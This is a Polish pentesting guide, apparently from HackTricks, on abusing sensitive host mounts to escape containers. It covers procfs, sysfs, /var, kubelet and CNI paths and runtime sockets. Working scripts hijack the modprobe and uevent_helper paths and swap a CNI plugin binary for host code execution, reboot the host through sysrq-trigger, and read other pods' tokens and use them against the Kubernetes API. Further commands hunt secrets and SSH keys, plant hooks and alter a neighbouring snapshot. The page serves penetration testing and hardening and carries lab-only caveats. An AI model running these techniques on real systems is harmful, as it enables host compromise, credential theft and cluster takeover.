# Wrażliwe montowania hosta

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Montowania hosta to jeden z najważniejszych praktycznych wektorów ucieczki z kontenera, ponieważ często niwelują starannie odizolowany widok procesu i ponownie zapewniają bezpośredni dostęp do zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounty `/proc`, `/sys`, `/var`, socketów runtime, stanu zarządzanego przez kubelet czy ścieżek związanych z urządzeniami mogą ujawnić mechanizmy kontroli jądra, dane uwierzytelniające, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.

Ta strona jest oddzielona od poszczególnych stron o zabezpieczeniach, ponieważ model nadużyć obejmuje wiele obszarów. Zapisywalne montowanie hosta jest niebezpieczne częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu dokładnej ścieżki hosta, która została udostępniona. Omówienie tego jako osobnego zagadnienia znacznie ułatwia analizę powierzchni ataku.

Porównaj też zapisywalny katalog hosta z odpowiadającą mu ścieżką wewnątrz każdego kontenera. Jeśli jest zamontowany na katalogu zawierającym wykonywalne skrypty startowe, użytkownik hosta z niższymi uprawnieniami może umieścić tam kod, który entrypoint kontenera o wyższych uprawnieniach załaduje przy następnym ponownym uruchomieniu. Potwierdź dokładne źródło i cel bind mounta, uprawnienia do zapisu i przeszukiwania katalogu, pętlę entrypointa i wymóg pliku wykonywalnego, UID runtime oraz rzeczywisty wyzwalacz ponownego uruchomienia. UID 0 kontenera nie oznacza automatycznie UID 0 hosta; wpływ na hosta zależy od mapowania user namespace i zasad montowania. Pasywny przegląd powinien raportować ścieżki i uprawnienia, nie zapisując skryptu ani nie uruchamiając ponownie workloadu.

Kontener Linuksa może działać wewnątrz maszyny wirtualnej zarządzającej, która udostępnia część systemu plików osobnego hosta Windows. [Foldery współdzielone VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) to jeden ze sposobów udostępniania plików hosta w systemie gościa, ale root w tej maszynie wirtualnej nadal jest odrębną tożsamością od administratora Windows. Jeśli udział udostępnia odczytywalny prywatny klucz SSH użytkownika, potraktuj go jako wskazówkę dotyczącą danych uwierzytelniających: zweryfikuj dokładne montowanie oparte na hoście, właściciela i dostęp do klucza, pasujące konto oraz **efektywną** politykę autoryzowanych kluczy serwera SSH w Windows, zanim stwierdzisz, że umożliwia on logowanie do hosta. Współczesny [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) często używa osobnego pliku `administrators_authorized_keys` dla kont administratorów. Nie umieszczaj zawartości kluczy prywatnych w rutynowych wynikach enumeracji; do pasywnej triage wystarczą metadane montowania i ścieżki do klucza.

## Udostępnienie `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy sterujące jądrem o dużym znaczeniu. Bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera udostępniający nieoczekiwane zapisywalne wpisy proc może więc prowadzić do ujawnienia informacji, odmowy usługi lub bezpośredniego wykonania kodu na hoście.

Ścieżki procfs o dużym znaczeniu obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (zwłaszcza `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Nadużycie

Zacznij od sprawdzenia, które wpisy procfs o dużym znaczeniu są widoczne lub zapisywalne:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Te ścieżki są interesujące z różnych powodów. Zapis do `core_pattern`, `modprobe` i `binfmt_misc` może umożliwić wykonanie kodu na hoście. `kallsyms`, `kmsg`, `kcore` i `config.gz` to cenne źródła informacji przy rozpoznaniu przed kernel exploitation. `sched_debug` i `mountinfo` ujawniają informacje o procesach, cgroup i systemie plików, które mogą pomóc odtworzyć układ hosta z wnętrza kontenera.

Praktyczne znaczenie każdej ścieżki jest inne, a traktowanie ich tak, jakby miały taki sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
  Jeśli ścieżka jest zapisywalna, to jedna z najbardziej niebezpiecznych ścieżek procfs, ponieważ po awarii kernel wykonuje handler potoku. Kontener, który może ustawić `core_pattern` tak, by wskazywał payload w swojej warstwie overlay lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na hoście. Zobacz też [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
- `/proc/sys/kernel/modprobe`
  Ta ścieżka określa helper userspace używany przez kernel, gdy musi uruchomić logikę ładowania modułów. Jeśli można ją zapisywać z kontenera, a jej zawartość jest interpretowana w kontekście hosta, może stać się kolejnym prymitywem umożliwiającym wykonanie kodu na hoście. Jest szczególnie interesująca w połączeniu z możliwością wywołania tego helpera.
- `/proc/sys/vm/panic_on_oom`
  Zwykle nie jest to prosty prymityw do ucieczki z kontenera, ale może zamienić presję na pamięć w odmowę usługi obejmującą cały host, powodując panikę kernela w przypadku OOM.
- `/proc/sys/fs/binfmt_misc`
  Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej wartości magicznej i uzyskać wykonanie w kontekście hosta, gdy uruchomiony zostanie plik z pasującą zawartością.
- `/proc/config.gz`
  Przydatny podczas triage pod kątem kernel exploitów. Pozwala ustalić, które podsystemy, mechanizmy zabezpieczeń i opcjonalne funkcje kernela są włączone, bez potrzeby dostępu do metadanych pakietów hosta.
- `/proc/sysrq-trigger`
  Służy głównie do odmowy usługi, ale jest to bardzo poważna ścieżka. Może natychmiast zrestartować hosta, wywołać panikę kernela lub w inny sposób zakłócić jego działanie.
- `/proc/kmsg`
  Ujawnia komunikaty z bufora pierścieniowego kernela. Przydatny do fingerprintingu hosta i analizy awarii, a w niektórych środowiskach także do wycieku informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
  Jest cenny, gdy można go odczytać, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia kernel exploitów.
- `/proc/[pid]/mem`
  To bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest dostępny i spełnione są wymagane warunki podobne do tych dla ptrace, może umożliwić odczyt lub modyfikację pamięci innego procesu. Rzeczywisty wpływ zależy w dużej mierze od uprawnień, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
  Udostępnia widok pamięci systemowej przypominający obraz core. Plik jest ogromny i niewygodny w użyciu, ale jeśli można go sensownie odczytać, oznacza to poważne narażenie pamięci hosta.
- `/dev/kmem` i `/dev/mem`
  Są to historycznie niebezpieczne interfejsy **urządzeń** umożliwiające bezpośredni dostęp do pamięci, a nie pliki procfs. W wielu nowoczesnych systemach nie występują lub są mocno ograniczone, ale jeśli kontener może otworzyć ich kopię zamontowaną z hosta, należy uznać to narażenie za krytyczne. Sprawdzaj je razem z innymi wrażliwymi montowaniami `/dev`, zamiast szukać nieistniejących ścieżek `/proc/kmem` lub `/proc/mem`.
- `/proc/sched_debug`
  Ujawnia informacje o planowaniu i zadaniach, które mogą ujawnić tożsamość procesów hosta, nawet gdy inne widoki procesów wyglądają na bardziej ograniczone, niż można by się spodziewać.
- `/proc/[pid]/mountinfo`
  Jest niezwykle przydatny do odtworzenia rzeczywistego położenia kontenera na hoście, ustalenia, które ścieżki korzystają z overlay, oraz sprawdzenia, czy zapisywalne montowanie odpowiada zawartości hosta, czy tylko warstwie kontenera.

Jeśli można odczytać `/proc/[pid]/mountinfo` lub szczegóły overlay, wykorzystaj je do ustalenia ścieżki systemu plików kontenera na hoście:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Te polecenia są przydatne, ponieważ wiele sposobów na wykonanie kodu na hoście wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.

### Przykład: Przygotowanie ścieżki helpera `modprobe`

Jeśli z poziomu kontenera można zapisywać do `/proc/sys/kernel/modprobe`, a ścieżka helpera jest interpretowana w kontekście hosta, można przekierować ją na payload kontrolowany przez atakującego. Katalog upper warstwy overlay musi być widoczny pod właściwą ścieżką na hoście, a wynik potwierdzający wykonanie należy zapisać z powrotem w tej samej widocznej dla hosta warstwie kontenera, jeśli kontener nie montuje również hostowego `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Dokładny sposób wyzwolenia zależy od celu i zachowania jądra, dlatego celowo nie jest zgadywany. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Najważniejsze jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie pomocnika jądra do zawartości ścieżki hosta kontrolowanej przez atakującego. Brak `upperdir` w overlay, ścieżka, której host nie może rozwiązać, montowanie sysctl tylko do odczytu lub jądro, które nigdy nie wywołuje wybranego pomocnika, przerywają ten łańcuch.

### Pełny przykład: rekonesans jądra z `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena podatności na exploit, a nie natychmiastowe wydostanie się z kontenera:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje i mechanizmy ochrony jądra zostały wkompilowane. Zazwyczaj nie prowadzi to bezpośrednio do ucieczki z kontenera, ale może znacznie przyspieszyć analizę podatności jądra.

### Pełny przykład: ponowne uruchomienie hosta przez SysRq

Jeśli `/proc/sysrq-trigger` jest zapisywalny i umożliwia dostęp do widoku hosta:

```bash
echo b > /proc/sysrq-trigger
```

Efektem jest natychmiastowy restart hosta. To nie jest subtelny przykład, ale wyraźnie pokazuje, że ujawnienie procfs może mieć znacznie poważniejsze skutki niż ujawnienie informacji.

## Ekspozycja `/sys`

sysfs udostępnia dużą ilość informacji o stanie jądra i urządzeń. Niektóre ścieżki sysfs służą głównie do fingerprintingu, podczas gdy inne mogą wpływać na uruchamianie pomocniczych programów, zachowanie urządzeń, konfigurację modułów bezpieczeństwa lub stan firmware’u.

Wartościowe ścieżki sysfs obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na działanie mechanizmów zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach ze źle skonfigurowanym dostępem. `/sys/kernel/vmcoreinfo` może ujawniać informacje o zrzutach awaryjnych i układzie jądra, przydatne do niskopoziomowego fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia rozruchowe przechowywane w firmware, co czyni je znacznie poważniejszym zagrożeniem niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ to interfejs przeznaczony dla programistów, wobec którego obowiązuje znacznie mniej założeń dotyczących bezpieczeństwa niż w przypadku utwardzonych interfejsów jądra przeznaczonych do środowisk produkcyjnych.

Każdy wpis sysfs z tej listy zależy od **jądra, konfiguracji i sprzętu**. Współczesne węzły zwirtualizowane często w ogóle nie zawierają `uevent_helper`, zmiennych EFI ani wpisów urządzeń termicznych. Brakującą ścieżkę odnotuj jako niespełniony warunek wstępny, zamiast zakładać, że przykład z innego jądra będzie miał zastosowanie.

Przydatne polecenia do sprawdzania tych ścieżek:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Co sprawia, że te polecenia są interesujące:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien być dostępny wyłącznie z hosta.
- `/sys/kernel/debug` to często najbardziej alarmujące znalezisko w tej grupie. Jeśli `debugfs` jest zamontowany i można go odczytywać lub zapisywać, należy liczyć się z szeroką powierzchnią dostępną z poziomu jądra, której dokładne ryzyko zależy od włączonych węzłów debugowania.
- Dostęp do zmiennych EFI występuje rzadziej, ale ma duży wpływ, ponieważ dotyczy ustawień przechowywanych w firmware, a nie zwykłych plików środowiska uruchomieniowego.
- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego escape z powłoki.
- `/sys/kernel/vmcoreinfo` służy głównie do rozpoznawania hosta i analizy awarii; może pomóc w zrozumieniu niskopoziomowego stanu jądra.

### Pełny przykład: `uevent_helper`

`/sys/kernel/uevent_helper` zależy od jądra i jego konfiguracji; nie występuje w wielu współczesnych systemach. Jeśli istnieje, jest zapisywalny i dostępny jest użyteczny wyzwalacz `uevent`, jądro może uruchomić helpera kontrolowanego przez atakującego. Ścieżka użyta do wygenerowania dowodu musi być widoczna zarówno z perspektywy hosta, jak i kontenera:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Powodem, dla którego to działa, jest interpretowanie ścieżki helpera z perspektywy hosta. Po wywołaniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera. `/sys/class/mem/null/uevent` to konkretny trigger w kernelach, które go udostępniają; inne urządzenia mogą udostępniać własne pliki `uevent`, ale nie wybieraj żadnego w ciemno na prawdziwym sprzęcie. Przywróć pierwotną wartość przed opuszczeniem labu. Nie zgłaszaj, że ta technika jest dostępna, jeśli brakuje pliku helpera lub kontrolowanego triggera.

## Ekspozycja `/var`

Montowanie hostowego `/var` w kontenerze jest często niedoceniane, ponieważ nie wygląda tak spektakularnie jak montowanie `/`. W praktyce może wystarczyć, by uzyskać dostęp do gniazd runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, rzutowanych tokenów service account oraz systemów plików sąsiednich aplikacji. We współczesnych węzłach `/var` często zawiera najbardziej interesujący z operacyjnego punktu widzenia stan kontenerów.

### Przykład Kubernetes

Pod z `hostPath: /var` często może odczytać rzutowane tokeny innych podów i zawartość snapshotów overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Te polecenia pomagają ustalić, czy mount udostępnia jedynie nieistotne dane aplikacji, czy też poświadczenia klastra o wysokich uprawnieniach. Możliwy do odczytania token service account może natychmiast zmienić lokalne wykonanie kodu w dostęp do Kubernetes API.

Jeśli token jest dostępny, sprawdź, do czego zapewnia dostęp, zamiast poprzestawać na samym jego wykryciu:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Skutki mogą być znacznie poważniejsze niż uzyskanie dostępu do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zmienić zamontowane `/var` w sposób na przejęcie całego klastra.

### Przykład Docker i containerd

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes korzystających z containerd mogą być w `/var/lib/containerd` lub w ścieżkach specyficznych dla danego snapshottera:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Jeśli zamontowany `/var` udostępnia zapisywalną zawartość snapshotu innego workloadu, atakujący może być w stanie zmodyfikować pliki aplikacji, umieścić treści webowe lub zmienić skrypty startowe bez ingerowania w konfigurację bieżącego kontenera.

Na **jednorazowym workloadzie laboratoryjnym** zapisywalna zawartość snapshotu może posłużyć do zademonstrowania manipulowania aplikacją, odzyskiwania sekretów lub lateral movement. Najpierw przypisz runtime container ID do dokładnego snapshotu i nigdy nie edytuj niezwiązanego z nim ani produkcyjnego snapshotu:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Te polecenia są przydatne, ponieważ pokazują trzy główne rodzaje skutków zamontowania `/var`: modyfikowanie aplikacji, odzyskiwanie sekretów i lateral movement do sąsiednich workloadów.

Bezpośrednie zapisy do snapshotu omijają normalne zarządzanie stanem przez runtime i mogą uszkodzić kontener lub zniszczyć dowody. Odkrywanie tylko do odczytu odtworzono lokalnie na Dockerze `overlay2`: znacznik zapisany w sąsiednim, tymczasowym kontenerze pojawił się w ` /var/lib/docker/overlay2/<id>/diff/`. Modyfikowanie rzeczywistego snapshotu ogranicz do tymczasowego kontenera utworzonego na potrzeby tego testu.

## Stan Kubelet, wtyczki i ścieżki CNI

Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniane przez uprzywilejowane DaemonSety, agenty CNI, wtyczki CSI działające na węzłach, operatory GPU i narzędzia pomocnicze pamięci masowej. Łatwo zbagatelizować te montowania jako „infrastrukturę węzła”, ale znajdują się bezpośrednio na ścieżce wykonywania nowych podów i często zawierają dane uwierzytelniające kubelet, zamontowane sekrety, gniazda rejestracyjne oraz wykonywalne pliki binarne wtyczek po stronie hosta.

Cele o dużej wartości obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne polecenia do przeglądu:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Dlaczego te ścieżki są istotne:

- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienta kubelet oraz inne poświadczenia lokalne dla węzła, których czasami można ponownie użyć w komunikacji z API serverem lub punktami końcowymi TLS dostępnymi dla kubeleta, zależnie od projektu klastra.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` często zawiera rzutowane tokeny service account oraz zamontowane Secrets sąsiednich podów działających na tym samym węźle.
- `/var/lib/kubelet/pod-resources/kubelet.sock` służy głównie do rozpoznania, ale jest bardzo przydatnym źródłem informacji: ujawnia, które pody i kontenery aktualnie korzystają z GPU, hugepages, urządzeń SR-IOV i innych rzadkich zasobów lokalnych dla węzła.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` ujawniają, które pluginy CSI, DRA i device są zainstalowane oraz z którymi socketami kubelet ma się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko czytelne, problem staje się znacznie poważniejszy.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` i `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp z prawem zapisu często daje możliwość późniejszego wykonania kodu na hoście, a nie tylko wgląd w konfigurację.<sup>[[2]](#references)</sup>

### Pełny przykład: zapisywalny `/opt/cni/bin`

Jeśli katalog binarny CNI hosta jest zamontowany z prawem odczytu i zapisu, podmiana pluginu może wystarczyć do uzyskania wykonania kodu na hoście przy następnym tworzeniu przez kubelet sandboxa poda na tym węźle:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Nie jest to tak bezpośrednie jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przejętych podach infrastrukturalnych Kubernetes. Znacznik jest zapisywany obok zamontowanej wtyczki, dzięki czemu kontener może go pobrać nawet bez montowania host-root lub host-`/tmp`. Wrapper zachowuje oryginalne argumenty i standardowe wejście, a następnie przykład przywraca oryginalny plik binarny. Najważniejsze jest to, że zmodyfikowany plik binarny zostaje później uruchomiony przez proces konfiguracji sieci hosta, a nie przez bieżący kontener. Używaj wyłącznie węzła przeznaczonego do testów, ponieważ nieprawidłowy wrapper może uniemożliwić nowym sandboxom Pod uzyskanie łączności sieciowej.

## Gniazda środowiska uruchomieniowego

Wrażliwe montowania hosta często obejmują gniazda środowiska uruchomieniowego, a nie całe katalogi. Są tak istotne, że warto wyraźnie o nich przypomnieć:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne ścieżki exploitation po zamontowaniu jednego z tych socketów.

Szybki schemat pierwszej interakcji:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Jeśli jedna z tych metod zadziała, droga od „zamontowanego socketu” do „uruchomienia bardziej uprzywilejowanego kontenera siostrzanego” jest zwykle znacznie krótsza niż jakakolwiek ścieżka ucieczki z kernela.

Ten sam dostęp do daemona może też umożliwić **utrzymanie dostępu do hosta**. Kontener pomocniczy z zapisywalnym bind mountem katalogu głównego hosta może otrzymać pliki przez `docker cp`, a następnie użyć `docker exec`, aby umieścić klucz SSH, jednostkę usługi lub inny plik zapewniający utrzymanie dostępu w zamontowanej ścieżce hosta. Granicą bezpieczeństwa są uprawnienia daemona do tworzenia mounta hosta; `docker cp` służy jedynie do wstępnego skopiowania plików. Po udostępnieniu socketu środowiska uruchomieniowego sprawdzaj zarówno nowo utworzone kontenery, jak i zapisy w ścieżkach hosta związanych z uwierzytelnianiem lub uruchamianiem usług.

## Przejęcie zadania przez zapisywalną ścieżkę hosta

Niebezpieczny może być zapisywalny mount hosta, nawet jeśli nie udostępnia `/`. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, wtyczki lub pliki używane później przez zaplanowane zadanie albo usługę po stronie hosta, kontener może być w stanie zmienić to, co host wykonuje.

Ogólny przebieg analizy:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Jeśli proces hosta korzysta z zapisywalnego pliku, podczas testowania payload powinien być prosty i łatwy do zaobserwowania:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Interesującą kwestią jest granica zaufania: zapis odbywa się wewnątrz kontenera, ale wykonanie następuje później w kontekście usługi hosta. W ten sposób wąski hostPath lub bind mount staje się mechanizmem umożliwiającym opóźnione wykonanie kodu na hoście.

## Pliki należące do roota na współdzielonej ścieżce hosta

Konto w kontenerze, które może uzyskać uprawnienia roota, może być w stanie umieścić plik należący do roota na zapisywalnej ścieżce używanej także przez hosta. Jeśli UID 0 w kontenerze mapuje się na UID 0 hosta, oba widoki wskazują ten sam plik, a montowanie hosta zezwala na wykonywanie SUID, użytkownik hosta, który może uruchomić znajdujący się na tej ścieżce plik wykonywalny SUID należący do roota, może przekroczyć granicę uprawnień hosta. W przypadku tego problemu z własnością pliku kontener nie musi działać z opcją `--privileged`. Zobacz [mapowania przestrzeni nazw użytkowników](protections/namespaces/user-namespace.md) oraz [omówienie SUID](privileged-containers.md), aby poznać odrębne warunki.

Sprawdź ścieżkę **z obu stron**: porównaj własność i tożsamość nieszkodliwego pliku, sprawdź `uid_map` i `gid_map` kontenera oraz przeanalizuj opcje montowania i zasady wykonywania na hoście. `rw` po stronie kontenera bez `nosuid` oznacza jedynie możliwość do dalszej analizy; nie potwierdza własności pliku na hoście, flag montowania hosta, dostępu użytkownika hosta ani tego, czy AppArmor/SELinux blokuje wykonanie. `noexec` ogranicza wykonywanie w widoku, w którym obowiązuje. Tagi `shared:` i `master:` w `/proc/self/mountinfo` opisują propagację montowania, a nie to, czy zawartość pliku jest współdzielona z hostem. Bind mount może nie mieć tych tagów. Ponowne użycie poświadczeń zapewniające logowanie do hosta to odrębny etap, niezwiązany z granicą uprawnień wynikającą ze współdzielonego pliku.

Pamięć masowa środowiska uruchomieniowego hosta może utworzyć podobną ścieżkę nawet bez jawnego bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) umożliwiało nieuprzywilejowanemu użytkownikowi hosta przechodzenie przez podkatalogi danych Dockera i wykonywanie plików z systemu plików kontenera; Moby naprawił uprawnienia w wersji 20.10.9 i zaznacza, że działające kontenery trzeba ponownie uruchomić, aby poprawić ich katalogi. Sprawdź dokładne ścieżki montowania `overlay2/<id>/merged` oraz uprawnienia wyszukiwania w każdym katalogu nadrzędnym, a następnie ustal, czy UID 0 kontenera mapuje się na UID 0 hosta, czy istnieje dostępny plik wykonywalny SetUID należący do roota oraz czy widok hosta zezwala na wykonywanie SetUID. Kontenery rootless lub korzystające z remapowania przestrzeni nazw użytkowników, `nosuid`, `noexec`, `no_new_privs` oraz polityka MAC mogą zmienić wynik. Sama wersja środowiska uruchomieniowego lub dostępna ścieżka to wskazówka do dalszej analizy, a nie dowód wykonania kodu z uprawnieniami roota hosta; sprawdź metadane montowania i pliku, nie uruchamiając potencjalnie niebezpiecznego pliku wykonywalnego.

## CVE związane z montowaniem

Montowania hosta mają również związek z lukami w środowiskach uruchomieniowych. Do ważnych nowszych przykładów należą:

- `CVE-2024-21626` w `runc`, gdzie leaked deskryptor pliku katalogu mógł ustawić katalog roboczy w systemie plików hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe pliki Dockerfile, frontend oraz przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub uzyskanie podwyższonych uprawnień podczas budowania.
- `CVE-2024-1753` w przepływach budowania Buildah i Podman, gdzie spreparowane bind mounty podczas budowania mogły udostępnić `/` z prawami do odczytu i zapisu.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie błąd TOCTOU podczas rozpakowywania obrazu mógł pozwolić specjalnie spreparowanemu obrazowi modyfikować system plików hosta podczas pobierania.

